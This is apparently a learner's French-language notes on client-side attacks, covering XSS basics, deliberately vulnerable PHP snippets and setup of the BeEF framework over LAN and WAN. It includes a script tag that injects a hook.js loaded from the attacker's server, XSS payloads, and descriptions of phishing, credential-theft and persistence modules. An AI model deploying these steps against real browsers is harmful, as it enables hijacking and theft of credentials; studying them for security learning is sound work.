# Client Side Attacks

= attaque où la connexion au contenu malveillant est initiée à partir du client (généralement en étant incité à cliquer sur un lien malveillant dans un e-mail, un message instantané, ou autre : user interaction often needed), contrairement aux server-side attacks où le serveur initie l'attaque (par exemple SQL injection). 
- l'attaquant send un link ou autre
- le client clique et initie la connection au serveur malicieux
- le serveur send back le code malicieux

L'objectif étant de cibler les vulnérabilités de l'appareil client ou d'un ou plusieurs de ses logiciels (comprennent des logiciels de traitement de texte, lecteur PDF, des navigateurs Web, environnement Java, etc). Dans le but d’obtenir des informations sensibles (cookies, identifiants, numéro de CB, etc.) ou carrément de prendre le contrôle des postes de travail infectés.

Types de client-side attacks : cross-site scripting (xss), cross-site request forgery (csrf), content spoofing, session fixation, clickjacking




## plan
### I - Failles XSS
- **1. Bases du développement web**
  *  a. Page HTML
  *  b. Contient du PHP
- **2. Fonctionnement d'une session HTTP**
  *  a. Etape 1 : Requête HTTP du navigateur
  *  b. Etape 2 : Réponse HTTP du serveur
  *  c. Etape 3 : Traitement de la réponse HTTP par le navigateur
- **3. Sites vulnérables**
  *  a. failles XSS refletées ou non permanentes
  *  b. failles XSS stockées
  *  c. DOM-based XSS
- **4. Contre-mesures & Bypass**
  *  a. Sanitization
  *  b. Bypass les mesures

### II - BeEF-xss
- **1. Lancer un serveur de communication (local, port forwarding, ngrok)**
  *  a. En local pour avoir le server on en local + le hook.js
  *  b. Port forwarding ou Ngrok
- **2. Exploitation**
  *  a. Malicious code
  *  b. UI Panel : Details & Commands
  *  c. Persistance

### III - MiTM ARP Poisoning

### III - En pratique


# I. Failles XSS

Faille XSS (=cross-site scripting) : vulnérabilité de sécurité des pages Web, où l'attaquant arrive à injecter du code directement interprétable par un navigateur web, comme, par exemple, du JavaScript ou de l’HTML. Le navigateur ne fera aucune différence entre le code du site et celui injecté par l'attaquant, et exécutera le code.

Les possibilités sont nombreuses : redirection vers un autre site, vol de cookies, modification du code HTML de la page ; en bref, tout ce que ces langages de script vous permettent de faire.

3 catégories de XSS : 
- stored (persistent) = injects scripts that remain on the server
- reflected = injects scripts that are sent to server and then bounce back to user
- DOM-based = executed completly on the client side nothing to do with the server

Exemple : l'attaquant peut écrire un commentaire sur un blog, où il va mettre du JS qui fait une XSS. Et la prochaine fois qu'un mec va venir sur le blog, il va charger la page, qui contient le commentaire en JS (c'est une stored XSS) et le code malveillant va s'executer. Ce XSS va se déclencher pour chacun des utilisteurs légitimes qui vont charger la page après l'injection du JS. [Exemple d'exploitation faille XSS](https://www.youtube.com/watch?v=iHcXH8eByDA)


## 1. Bases du développement web

Dans une page web on a donc du HTML, CSS, Javascript.

- HTML =  langage de balise, qui permet de s'occuper du contenu du site (bouttons, menu, texte, vidéos, images, ...)
- CSS = langage de feuille de style, permet de styliser, mettre en forme le contenu (forme des menus, couleurs, polices d'écriture, ...)
- Javascript = langage qui permet de rendre les sites web interactifs
- React (=Angular JS, VueJS) = javascript library
- Nodejs = logiciel qui permet d'executer des applications javascript
- PHP = 
- Symfony (=Laravel) = framework PHP

```
Créer le premier site :
/img = on range les images du site
/dossier css = on a range les feuilles de style
/dossier js = pour les animations
index.hmtl = page principale de notre site web, première page sur laquelle les utilisateurs arrivent
```

### a. Page HTML

structure de base d'une page HMTL : 
```
<!doctype html> <!--declaration du document, doc HTML-->
<html> <!--balise qui contient l'ensemble de la page, et dedans y a deux sous balises-->
<head> <!--Premiere sous balise, tete de page-->
    <title>Texte</title> <!--balise par defaut, titre de la page qui saffiche sur longlet-->
    <!-- tout ce qui sera interne au site mais sans le voir, refereencement du site, liaison avec les feuilles de style css,..-->
    <meta charset="utf-8"> <!--charset est l'attribut de la balise-->
    <link rel="stylesheet" type="text/css" href="css/styles.css"> <!--link permet de faire une relation avec un fichier, attribut relation definit le type de relaiton, ici une feuille de style. Type de document, et ensuite href chemin pour acceder-->
</head>
<body> <!--contient tout le contenu-->
    <h1> <!--headline1, c'est le gros titre de la page-->
        coucou
    </h1>
    <h2> <!--ca va jusqu'à h6-->
        voilà ma page
    </h2>
    <p> <!--balise paragraphe--> 
        Bienvenue sur mon site le sang
    </p>
    <a href="http://google.com/" target="_BLANK">Lien Vers Google
    </a><!--balise pr integrer des liens, target="_BLANK" permet de dire qu'il ouvre le lien dans une nouvelle page blanche, autre onglet --> 
    <img src="img/TheEnd.jpeg">
    <img src="img/allolaterre.png" width="200">
</body>
</html>
```

### b. Contient du PHP

Schéma du cas où la page à renvoyer par le serveur contient du code PHP
![Capture d’écran 2023-08-07 à 12 21 02](https://github.com/iciamyplant/client_side_attack/assets/57531966/8d995a00-79db-4bac-8aa7-3b21cab03939)

```
// php -S localhost:8080 // Pour executer du php, on doit lancer un serveur php
// index.php :
<html>
    <head>
        <title>Exemple</title>
    </head>
    <body>
        <?php 
          echo "C'est un script PHP!\n";
        ?>
    </body>
</html>
```



[Tuto de Graven pour HTML](https://www.youtube.com/watch?v=J9w-cir5a6U&t=425s)
[Playlist Graven web : HTML, CSS, PHP](https://www.youtube.com/playlist?list=PLMS9Cy4Enq5JAzNgWPK96HnkE_U7Ol3im)
[Tuto de Graven pour créer un site avec React & Nodejs](https://www.youtube.com/watch?v=yHoI0n2VxMU)


## 2. Fonctionnement d'une session HTTP

Quand on demande une page web on fait une requête HTTP. Le navigateur (client) va d'abord établir une connexion avec le serveur. Ensuite le client fait la requête HTTP. Le serveur web renvoie les fichiers qui contiennent du code (HTML donne la structure de la page, CSS la mise en forme, Javascript gère l'intéractivité avec l'internaute : les clics de l'internaute sont récupérés par le Javascript et des traitements sont déclenchés). Ils communiquent via le protocole HTTP, utilisé dans le but de permettre un transfert de fichiers (essentiellement au format HTML) localisés grâce à une chaîne de caractères appelée URL

### a. Etape 1 : Requête HTTP du navigateur

Requête HTTP = ensemble de lignes envoyé au serveur par le navigateur. Comprend :
- Une ligne de requête: c'est une ligne précisant le type de document demandé, la méthode qui doit être appliquée, et la version du protocole utilisée (généralement HTTP/1.0). La ligne comprend ces trois éléments devant être séparés par un espace.
- Les champs d'en-tête de la requête: un ensemble de lignes facultatives permettant de donner des informations supplémentaires sur la requête et/ou le client (Navigateur, système d'exploitation, ...). Chacune de ces lignes est composée d'un nom qualifiant le type d'en-tête, suivi de deux points : et de la valeur de l'en-tête
- Le corps de la requête: c'est un ensemble de lignes optionnelles devant être séparées des lignes précédentes par une ligne vide et permettant par exemple un envoi de données par une commande POST lors de l'envoi de données au serveur par un formulaire


```
GET /fichier.html HTTP/1.1[CRLF]
Host: www.monsite.com[CRLF]
User-Agent: Mozilla/5.0 Safari/531.9[CRLF]
[CRLF]
```

```
----- Ligne de requête -----
GET /fichier.html HTTP/1.1[CRLF] // ici on demande le document fichier.html avec la méthode GET et la version HTTP/1.1 + CRLF = délimiteur utilisé par le protocole HTTP pour séparer les lignes de l'en-tête

----- champs http ou en-têtes http (facultatives) -----
Host: www.monsite.com[CRLF] // champ http avec comme valeur www.monsite.com
User-Agent: Mozilla/5.0 Safari/531.9[CRLF] // champ http User-Agent avec comme valeur Mozilla/5.0 Safari/531.9, donne des informations sur le client

----- ligne vierge -----
[CRLF]

----- corps (facultatif) -----
// pas de corps ici mais pour les requetes POST y en a un par exemple
```

Les différents types de requêtes sont définis par l’utilisation de méthodes HTTP différentes. Ces méthodes HTTP permettent d’indiquer au serveur quelle opération le client souhaite effectuer. Le méthode GET par exemple permet d’indiquer qu’on souhaite récupérer une ressource, tandis que POST est utilisée pour transmettre des données en vue d’un traitement à une ressource, DELETE est utilisée pour indiquer qu’on souhaite supprimer une ressource, etc.

| méthode|utilité|
|---|---|
|GET|permet de demander une ressource sans la modifier |
|POST|permet de transmettre des données dans le but de manipuler une ressource|
|PUT|permet de remplacer ou d’ajouter une ressource sur le serveur|
|DELETE|permet de supprimer une ressource du serveur |
|HEAD|permet de demander des informations sur la ressource sans demander la ressource elle-même|
|PATCH|permet de modifier partiellement une ressource|
|OPTIONS |permet d’obtenir les options de communication d’une ressource ou du serveur|
|CONNECT|permet d’utiliser un proxy comme un tunnel de communication|
|TRACE|permet de tester et d’effectuer un diagnostic de la connexion et demandant au serveur de retourner la requête reçue|



Exemple : On demande la chaîne YouTube, https://www.youtube.com/channel/UC9wzC5mFFcIdguoyveTo6Ng (Format des URLs : protocole://adresse-du-serveur:port/chemin/ressource). Clic droit sur la page du navigateur > inspecter l'élément > Onglet Network // permet de voir toutes les requêtes HTTP que fait notre navigateur.

<img width="1438" alt="Capture d’écran 2023-08-04 à 16 06 43" src="https://github.com/iciamyplant/client_side_attack/assets/57531966/901f61f9-7ab4-43a5-820a-cf0558583259">


### b. Etape 2 : Réponse HTTP du serveur

Réponse HTTP = ensemble de lignes envoyées au navigateur par le serveur. Comprend :
- Une ligne de statut : précisant la version du protocole utilisé et l'état du traitement de la requête à l'aide d'un code et d'un texte explicatif. La ligne comprend trois éléments devant être séparés par un espace : La version du protocole utilisé, Le code de statut, La signification du code
- Les champs d'en-tête de la réponse: il s'agit d'un ensemble de lignes facultatives permettant de donner des informations supplémentaires sur la réponse et/ou le serveur
- Le corps de la réponse: il contient le document demandé

```
HTTP/1.1 200 OK[CRLF]
Date: Thu, 24 Sep 2009 19:37:34 GMT[CRLF]
Server: Apache/2.2.3[CRLF]
Content-Length: 7234[CRLF]
Content-Type: text/html; charset=UTF-8[CRLF]
[CRLF]
[ici se trouve le corps (body) de la réponse]
```

La première ligne de la réponse contient toujours le 'code' HTTP indiquant si la requête a réussi ou pas. Puis, comme pour la réponse, on trouve les lignes des champs HTTP. Tout ceci constitue l'en-tête de la réponse. Ensuite se trouve le corps de la réponse, qui dans le cas d'un GET d'un fichier HTML contient par exemple le code HTML de la page visée.

Exemple : Le serveur renvoie la page HTML

<img width="1439" alt="Capture d’écran 2023-08-04 à 16 07 27" src="https://github.com/iciamyplant/client_side_attack/assets/57531966/92499e9f-2e74-45fe-a368-b2c349c782d8">



### c. Etape 3 : Traitement de la réponse HTTP par le navigateur

Quand il recoit le premier bloc de données, parse les infos pour les transformer en DOM (=transforme le fichier HTML en objets JS) et CSSOM, utilisés par le moteur de rendu. Chaque navigateur est constitué d'un moteur de rendu qui permet d'afficher une page web (Chrome et Blink, Safari et webkit, ...). Le DOM est la représentation interne du balisage pour le navigateur. Le DOM est également exposé et peut être manipulé via diverses API en JavaScript.

cinq étapes dans le chemin de rendu en 3 étapes : PARSING, RENDU, INTERACTIVITE : 
1. traiter le balisage HTML et créer l'arborescence DOM. Le DOM tree décrit le contenu du document. L'élément <html> est la première balise et le premier nœud racine du document tree. L'arbre reflète les relations et les hiérarchies entre différentes balises. Les balises imbriquées dans d'autres balises sont des nœuds enfants. Plus le nombre de nœuds DOM est élevé, le plus de temps ca prends pour construire le DOM tree
2. scanner de préchargement analysera le contenu disponible et demandera des ressources hautement prioritaires telles que CSS, JavaScript et les polices. Grâce à l'analyseur de précharge, il n'est pas nécessaire d'attendre que l'analyseur trouve une référence à une ressource externe pour la demander
3. construction du CSSOM. Le navigateur convertit les règles CSS en une carte de styles qu'il peut comprendre et utiliser. Le navigateur passe en revue chaque ensemble de règles de la feuille de style CSS, créant ainsi une arbre de noeuds avec des relations parent, enfant et sœurs basées sur les sélecteurs CSS.
4. compilation du JS : lors de l'analyse du CSS et de la création du CSSOM, d'autres ressources, notamment des fichiers JavaScript, sont en cours de téléchargement (grâce au scanner de préchargement). JavaScript est interprété, compilé, analysé et exécuté. Les scripts sont analysés dans des arbres à syntaxe abstraite. Certains moteurs de navigateur utilisent le Arbre de syntaxe abstraite et le transmettent à un interpréteur, générant le code binaire exécuté sur le thread principal
5. Le navigateur crée également une arbre d'accessibilité que les périphériques d'assistance utilisent pour analyser et interpréter le contenu. Le modèle d'objet d'accessibilité (AOM) est comme une version sémantique du DOM.
6. rendu : style, mise en page, peinture. Les arbres CSSOM et DOM créés à l'étape d'analyse sont combinés en un arbre de rendu qui est ensuite utilisé pour calculer la mise en page de chaque élément visible, qui est ensuite peint à l'écran
7. interactivite

[cours sur le traitement de la réponse HTTP par le navigateur](https://developer.mozilla.org/fr/docs/Web/Performance/How_browsers_work)
[cours sur les session HTTP](https://www.pierre-giraud.com/http-reseau-securite-cours/requete-reponse-session/)


Mais attention : Les requêtes HTTP sont formulées par le client (navigateurs de vos visiteurs) et vous n’avez donc quasiment aucun contrôle dessus. Idem, les réponses HTTP sont créées par le serveur et vont en grande partie dépendre de la configuration de celui-ci et on a plus ou moins de controle sur la config selon l'hbergeur etc. 



## 3. Sites vulnérables

Essayons de créer des failles xss simples, en codant nous même des mini sites non protégés

### a. failles XSS refletées ou non permanentes

= le code malicieux n'est pas stocké sur le serveur, peut être inclu dans une URL.

```
/xss_tests/index.php //exemple faille xss non permante

<?php
    if(!empty($_GET['keyword']))
    {
        echo "Résultat(s) pour le mot-clé : ".$_GET['keyword']; //execute le code qu'on entre dans keyword, rien n'est vérifié
    }
?>
```
```
<script>alert('Ton site est vulnérable aux failles XSS');</script>    //JS
<h1 style="color:blue;"><u>Un titre personnalisé avec du CSS !</u></h1> //HTML CSS
<button onlick="alert('Exemple XSS');">bouton test</button> 
```

L'URL (=Uniform Resource Locator) permet de localiser les fichiers auxquels on veut accéder. 

|fragment de l'URL|explication|
|---|---|
|http://|protocole, indique au navigateur le protocole qui doit être utilisé pour récupérer le contenu|
|www.exemple.com|nom de domaine, indique à quel serveur web s'adresser (correspond à une adresse IP)|
|:80|port utilisé sur le serveur web. Généralement absent car le navigateur utilise les ports standards associé au protocole (80 pour HTTP, 443 pour HTTPS). Si le port utilisé par le serveur n'est pas celui par défaut, il faudra l'indiquer|
|/chemin/vers/monfichier.html|chemin, sur le serveur web, vers la ressource (à l'ancienne vrai chemin existant sur le serveur, ajd c'est une abstraction gérée par le serveur|
|?clé1=valeur1&clé2=valeur2|sont des paramètres supplémentaires fournis au serveur web, construits sous la forme d'une liste de paires de clé/valeur dont chaque élément est séparé par '&'. Le serveur web pourra utiliser ces paramètres pour effectuer des actions supplémentaires avant d'envoyer la ressource. Chaque serveur web possède ses propres règles quant aux paramètres|

````
<?php echo "Page ".urldecode($_SERVER[REQUEST_URI])."Not Found"; ?>
````


### b. failles XSS stockées

Stockée car le script est stocké dans la base de données par exemple, et sera aussi affiché à chaque démarrage de l’application. 
Exemple : blog où on peut écrire des commentaires, ces coms seront stockés dans une base de données. Si mal protégé, un attaquant peut injecter dans un commentaire un morceau de script JS, qui sera stocké dans la BDD, et script executé par chaque utilisateur qui charge la page ensuite.

[démo video](https://www.youtube.com/watch?v=E47rY21gXSY) 


### c. DOM-based XSS

Se produit lorsqu'une application contient du JS côté client, qui traite des données provenant d'une source non fiable, les données traitées permettent de modifier le DOM, cette attaque se produit généralement sur le navigateur web de la victime

[menu déroulant d'une langue par exemple, ou la variable langue est pas protégée, on peut injecter dans l'URL à la place de langue](https://www.youtube.com/watch?v=E47rY21gXSY)


## 4. Contre-mesures & Bypass

### a. Sanitization

- Quels sont les contre-mesures mises en place par les dev web ? ces mesures de protection = sanitization

De manière générale, tout ce qui vient de l’extérieur − saisi par un être humain dans un formulaire, ou bien reçu lors d’un appel à un webservice externe − doit être traité de manière particulière. [14 règles à suivre selon OWASP pour la prévention des failles XSS](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md). [Résumé des préventions] (https://www.geek-directeur-technique.com/2020/04/04/les-failles-de-securite-de-base-dans-le-web-2-le-cross-site-scripting-xss)

[Manipulez les données non fiables avec prudence](https://openclassrooms.com/fr/courses/1761931-securisez-vos-applications/5702792-manipulez-les-donnees-non-fiables-avec-prudence)
[Protégez votre code de l'injection](https://openclassrooms.com/fr/courses/6179306-securisez-vos-applications-web-avec-lowasp/8169286-protegez-votre-code-contre-l-injection)
[Comment se prémunir injection attack](https://owasp.org/Top10/fr/A03_2021-Injection/)

### b. Bypass les mesures

str_replace

si le nombre de caractères est limité ==> Burp suite permet d'intercepter la requete et avec le repeteur on peut modifier la requete avant de l'envoyer au serveur web 

- Quelles sont les techniques pour by-pass ces protections ?
- quels sont les payloads JS qui permettent de bypasser la plupart des contournements
- Voir comment bypasser telle ou telle fonctionnalité mise en place pour protéger le site web d'une attaque xss

[How to Bypass XSS Filters: A Practical Example](https://infosecwriteups.com/how-to-bypass-xss-filters-a-practical-example-3189877fe2ce)
[bypass](https://www.secjuice.com/xss-arithmetic-operators-chaining-bypass-sanitization/)





# II - BeEF-xss

Il existe plusieurs frameworks d'exploitation des failles XSS : BeEF-xss, The Cross-Site Scripting Framework (XSSF), OWASP Xenotix XSS Exploit Framework, Autopwn. Ainsi que des frameworks pour tester automatiquement s'il semble y avoir des vulnérabilités xss sur une page : Nesus, Nikto, SOAP UI tool...

BeEF-xss est un framework d'exploitation Web codé en PHP & JavaScript, se concentre sur l'exploitation de vulnérabilités du coté navigateur (client). Consiste à exploiter un vecteur d’attaque sur une machine cliente (vecteur XSS, CSRF, etc) pour ouvrir une porte d’accès au système, et d’examiner les exploitations potentielles dans le contexte courant du navigateur. Une fois une cible rattachée à BeEF, le framework exploite un tunnel asynchrone (principalement généré par Javascript/Ajax) afin de lancer l’exécution de modules dans le navigateur de la cible, et ainsi perpétuer des attaques à l’encontre du système. Open source project, started in 2006, last push 5 days ago on github, up to date

- lancer un serveur Linux avec beef installé dessus (voir Ngrok, faut ajouter des informations dans le fichier de config) // port forwarding. 
- on lance beef, et on obtient : l'url de l'interface administration + le hook.js à injecter
- injecter le hook.js dans une page web, site XSSed recense une grande partie de l’actualité liée à cette famille de vulnérabilités
- envoyer à la victime le lien (email, sms?) et donner une bonne raison de cliquer sur le lien
- la victime clique, son navigateur va exécuter le contenu du paramètre de l'url qui contient le code maveillant, le script nous retourne les données 
- on peut exécuter des commandes : play sound, webcam, ... et accéder à des informations comme cookies, plug-ins installés, log de ce qui est fait sur le site...
- possibilité de faire ses propres modules, regarder ce qui a été fait comme c'est de l'open source
- persistence : faire que ça fonctionne même quand l'onglet est fermé



## Lancer un serveur de communication (local, port forwarding, ngrok)

Quand on parle de serveur, on parle du hardware. Mais y a un certains nombre de programmes qui tournent sur le serveur qu'on appelle aussi serveurs, car ils répondent à des requetes.
- serveur HTTP : logiciel qui prend en charge les requettes client/serveur du protocole HTTP, ex : Apache, 2is, Nginx
- serveur Mysql : s'adresse au système de fichier pour récupérer des données
- serveur FTP : quand le dev a fini sa page web, il l'envoie sur le serveur hardware par l'intermédiaire du serveur ftp

|Type de serveur|Def|
|----|-----|
|serveur statique|un OS, et un serveur HTTP|
|serveur dynamique|en + inclue une BDD et un langage de script comme PHP (= dont le rôle est d'interpréter les demandes du client et de les traduire en HTML)|

![Capture d’écran 2023-08-03 à 18 30 54](https://github.com/iciamyplant/client_side_attack/assets/57531966/351c38cc-3bf5-4f8c-ab66-d700fbe08e6e)


#### A. En local pour avoir le server on en local + le hook.js

[Tutoriel](https://www.youtube.com/watch?v=V26rdXUFQAY)
`````
git clone https://github.com/beefproject/beef.git
cd beef
./install
leafpad config.yaml // change psswrd
./beef 
// server on http://127.0.0.1:3000/ui/panel
// hook.js http://127.0.0.1/hook.js
sudo beef-xss
`````

On va essayer de hook un browser en local sur la meme machine. On a notre pannel Beef ouvert dans firefox. On va ouvrir le hook.js dans un autre browser pour voir si ca marche et que ca s'affiche dans notre pannel. [Tutoriel using beef on LAN](https://www.youtube.com/watch?v=ZYB4B89vAyw)
````
sudo apt install chromium-driver //on instale chromium driver pour ouvrir le hook.js
// on lance le 127.0.0.1:3000/demos/basic.html
// ca fonctionne
````
Maintenant on va hook le browser d'une autre machine sur notre LAN. Apache est pré-installé sur Kali Linux. VM sur Virtual Box automatiquement en NAT, mettre en pont si jveux quelle ai son adress ip comme toutes les autres machines du reseau. 
````
ifconfig //doit etre en format 192.168. et pas en 10.
//mettre en bridge
// avoir éteint complétement la VM pr changer
````

````
cd /var/www/html
sudo vim index.html
//on ajoute le hook url dans le index.html
ifconfig //recup mon ip adress de mon vm kali
//je remplace dans la hook url par mon adresse ip de ma machine dans mon index.html
service apache2 start
service apache2 status
// maintenant entrer mon adresse ip de mon serveur avec une autre machine
//OK sur mon tel + sur mon mac
service apache stop
sudo beef-xss-stop
````
Ok, on a accès à notre page web hébergée sur notre serveur Apache sur la VM à partir de mon téléphone + du MAC sur le reseau local. On a réussi sur l'index.html de Apache de mettre le hook.js, et on arrive à envoyer des commandes sur mon tel et mac. Mais là on peut accéder à index.hmtl à partir des machines de mon réseau, mais il sera pas accessible à partir de l'internet. Maintenant on va essayer de hook un navigateur d'une machine qui n'est pas sur mon réseau local. Une solution est de prendre un hébergement et j'y envoyoie mes fichiers : sauf qui si on taff sur wordpress va falloir synchroniser la bdd etc. 2 autres solutions : port forwarding et ngrok

#### B. Port forwarding ou Ngrok

Port = chiffre ajouté en suffixe d'une adresse ip qui permet de savoir quelle application on veut contacter sur la machine. [Cours](https://www.youtube.com/watch?v=UyIcIl3B9ZU)

L'adresse IP publique de mon LAN chez moi = adresse de ma boxe internet. C'est elle qui me permet d'être sur internet, qui me relie à d'autres réseaux, personne d'autre sur internet n'a la meme adresse ip publique. Du point de vue de internet et de tous les autres sous-réseaux privés, je ne suis visible que par cette adresse. La boxe diffuse le réseau par la wifi, ou via ses ports ethernet.

Mon adresse IP publique elle dépend de mon FAI. Si je suis chez SFR, c'est SFR qui me la fournit. L'adresse réseau de SFR c'est 72.172.0.0. Tous les gens qui seront chez SFR auront une adresse ip qui commence par 72.172. Mais si je fais un ifconfig sur ma machine, par ex imaginons que je suis en 192.168.0.0. Mais alors comment on peut recevoir des notifications par exemple de YouTube sur une machine en particulier alors que YouTube ils peuvent voir que ma boxe internet ? Ca c'est le NAT. Donc dans des communications entre un serveur google et ma machine, c'est ma boxe qui demande au serveur, et le serveur repond à ma boxe. Et c'est la boxe qui va faire une translation entre mon adresse de ma machine sur mon reseau local et l'adresse de la boxe. 

Je peux, dans mon reseau privé, mettre des serveurs. Je peux installer un serveur apache, un serveur BDD, des serveurs TCP... Sauf que si j'installe un serveur apache sur le port 80, seules les ip qui sont sur le même reseau que moi pourront communiquer avec mon serveur Apache. Genre si j'ai un serveur apache imaginons sur le 192.168.0.26 et que mon pote de chez lui il ping mon serveur 192.168.0.26 il verra rien parce qu'en fait il ping sur son propre reseau. 

Pour que mon pote puisse voir mon serveur apache, il va falloir que je dise que je ne suis pas sur la 192.168.0.26 mais sur mon adresse ip publique de ma boxe. Mon pote fait un requette HTTP sur le port 80 à l'adresse publique. Mais la boxe ne va rien répondre parce qu'elle n'est pas un serveur web. La solution c'est une interface de gestion sur la boxe, et de dire que si y a une requete HTTP sur le port 80 qui arrive sur ma boxe, c'est pas la boxe qui doit répondre mais ma machine qui est apache sur mon reseau. Le port va automatiquement être redirigé vers l'adresse ip de ma machine qui est sur mon reseau local. C'est de la redirection de port. Port forwarding (=redirection de port) =  rediriger des paquets réseaux reçus sur un port donné d'un ordinateur ou un équipement réseau vers un autre ordinateur ou équipement réseau sur un port donné
[Explications](https://github.com/beefproject/beef/wiki/FAQ#how-do-i-configure-beef-on-a-server-behind-nat)

- Demande adresse ipv4 full stack
- Redirection de port 80 (http) et 443 (https) sur le routeur (attention IP source : toutes)
- Configurer Apache [configurer serveur apache](https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-configuring-apache-0164096/)
- Lancer Apache + Tester sur une machine sur WAN

`````
/// fichiers configs de Apache :
cd /etc/apache2
find répertoire -name nom-du-fichier //chercher fichier quand jsp ds quel repertoire
service apache2 restart
// entrer mon adresse ip publique avec une autre machine sur WAN, page d'accueil Apache OK
netstat -a // pour verifier si le port est bien libre
`````

- forward the public port (default 3000/tcp) from your border router to the BeEF server (<LAN IP>:3000) [doc](https://github.com/beefproject/beef/wiki/FAQ#how-do-i-configure-beef-on-a-server-behind-nat)
- hook navigateur de francois sur le WAN OK

`````
/home/kali/beef/config.yaml //fichier pour changer mdp beef
sudo beef-xss-stop
sudo beef-xss
cd /var/www/html
sudo vim index.html
//je remplace dans la hook url par mon adresse ip publique dans mon index.html http://<your WAN IP address>:3000/hook.js
// <script src="http://<IP>:3000/hook.js"></script>
service apache2 restart
 //hook navigateur de francois
`````

[installer un serveur web à la maison](https://www.magentix.fr/blog/un-serveur-web-a-la-maison.html)
J'ai fait avec le port forwarding, mais possibilité de faire avec Ngrok : [Tuto Ngrok de Grafikart](https://www.youtube.com/watch?v=PylWF44i2pY) Ngrok = outil qui permet de créer un tunnel vers votre environnement de développement en local. Ngrok va venir créer un tunnel. On ouvre ngrok, on dit ok je veux me connecter à toi. Là on ouvre un tunnel, comme un vpn, entre notre ordinateur et le serveur de ngrok, qui lui va nous créer un url sur le serveur de ngrok, que les utilisateurs vont pouvoir, eux, accéder directement au serveur qui est sur notre ordinateur. 

## Exploitation

### A. Malicious code

````
<script src="http://<IP de mon serveur>:3000/hook.js"></script>
// The <script> HTML element is used to embed executable code or data; this is typically used to embed or refer to JavaScript code
// J'ai un serveur sur <IP de mon serveur> où sur le port 80 y a un serveur HTTP Apache + port 3000 serveur beef
// quand le DOM de ma victime execute la ligne en haut, ca exécute le fichier hook.js, qui est un script en JS

// si je tappe http://<adresse ip de mon serveur>:3000/hook.js je peux voir le script
// The hook.js is built dynamically server side depending on the config options for beef
// core/main/handlers/hookedbrowsers.rb - Line 50 - call to build_beefjs!()
// core/main/handlers/modules/beefjs.rb - Line 16 - definition of build_beefjs!()
````


#### B. UI Panel : Details & Commands

|Details|A quoi ca correspond|
|----|----|
|browser.capabilities||
|browser date||
|browser.engine|= Moteur de rendu HTML (Chrome et Blink, Safari et webkit,...) |
|browser.langage|FR, ...|
|browser.name.reported|met tous les navigateurs et leurs versions|
|browser.plugins|chrome PDF viewer (= le truc qui permet d'ouvrir des PDF avec les contours gris), ... Attention, que les plug-in, pas les extensions. Or, depuis 2021, les plug-ins sont obsolètes par la plupart des navigateurs, tandis que les extensions sont largement utilisées ==> elles les sont généralement que du code source, alors que les plug-ins sont toujours des fichiers exécutables|
|browser.window.cookies||
|window size height| taille en hauteur de la fenêtre|
|window size width|taille en largeur de la fenêtre|
|cpu cores||
|screen height||
|screen width||
|host os family|OS X|

|Logs |
|----|
|si la fenêtre du navigateur a perdu le focus ou a retrouvé le focus|
|mouse click + position x;y|
|has executed instructions ....|

|commande|explication|
|-----|------|
|alert dialog|pop-up avec un texte où on écrit ce qu'on veut|
|prompt screen|pop-up mais la cible peut ecrire qqch et on peut recuperer ce quelle ecrit|
|fake flash update | pop-up en mode il faut faire une update. Si clique sur install ==> dwld le file. Donc si execute le fichier possibilité d'injecter un payload. On peut changer l'image du pop-up qui s'affiche pr que ca soit credible|
|google phishing| fake google gmail page|
|pretty theft|ask username and password using a floating div (fausse page on peut choisir facebook, linkedin, youtube etc.) |
|spyder eye|take a picture of the victime's browser window, mais que la fenetre du site, on voit pas les autres onglets|
|get geolocation|retrives the physical location of the hooked browser using third party hosted geolocation APIs |
|redirect browser|redirect the selected hooked browser to the adress specified in the 'redirected URL' input|
|...||


|Commandes préférées| ce qu'elle font|
|----|----|
|get geolocation (third-party)|j'arrive à avoir le FAI, l'adresse ip, la ville, country code, region|
|detect social networks | ca marche pour facebook, détecte si facebook est authentifié|
|blockui modal dialog |bloquer la fenetre avec un message|
|redirect browser|le rediriger sur une nouvelle page|



#### C. Persistance 


--> Quel est l'objectif ? Que veut-on faire sur l'ordinateur de la victime ?
- historique du navigateur
- afficher "arrêtes de jouer à lol" dès qu'il y joue
- persistant, avoir toujours accès même après qu'il ferme l'onglet


[User Guide](https://github.com/beefproject/beef/wiki/Introducing-BeEF)


### Beef-xss + ARP poisoning sur son réseau local ==> ca fait que hook.js est injecté dans toutes les pages http

Faille dans le protocole ARP
protocole ARP ==> a pour but de traduire une adresse IP en une adresse MAC, 

1 terminal demande l'adresse MAC d'une adresse IP, tout le monde dans le réseau recoit la demande car on est en broadcast. Normalement sur l'ordinateur concerné est censé repondre son adresse MAC. Mon Ip est ... voici ma mac : ....

Pour répondre au bon ordinateur, il crée un cache ARP (à partir des données qu'il vient de recevoir)

quand l'ordi 1 recoit la reponse, il peut mettre a jour son cache ARP aussi

[Arp poisoning avec ettercap](https://github.com/iciamyplant/camera_hack)


### Autres techniques persistance

==> faire installer une extension de navigateur malveillante

|Persistance module|github beef|mes tests|
|confirm_close_tab | still worked last i checked; but not as effective as it used to be. | pas dans chrome, marche dans safari mais nul, pirncipe que ca demande encore et encore si on veut fermer l'onglet|
|hijack_opener |works, but requires specific conditions |fonctionne pas dans chrome|
|invisible_htmlfile_activex|nice bug, but only ever worked in IE11. now patched.||
|jsonp_service_worker | not sure; and dependent on the web site exposing JSONP|rien ne se passe|
|man_in_the_browser | patched many years ago. never worked in IE ||
|popunder_window | browsers now block popups by default; however, this module still works if the users clicks somewhere on the page|marche pas|
|popunder_window_ie |nice bug, but only ever worked in IE11. now patched||

[pas trop de solutions de persistance pr rester dans le navigateur askip, si ce n'est si on a compromised host system, dans ce cas pr rester hook on peut installing a malicious browser extension, backdooring one of the browser components, or injecting into the browser process](https://github.com/beefproject/beef/issues/1655)


https://github.com/beefproject/beef/wiki/Persistence

Vous pouvez configurer BeEF pour créer des cookies persistants sur la machine victime qui survivront à une simple suppression du cache des cookies. Tant que la machine cible a une fenêtre de navigateur ouverte exécutant le code de crochet BeEF, l'attaquant aura accès au navigateur des victimes. C'est pendant cette fenêtre qu'un attaquant devrait lancer des exploits supplémentaires à partir du cadre BeEF pour maintenir une connexion persistante après la fermeture de la fenêtre du navigateur.


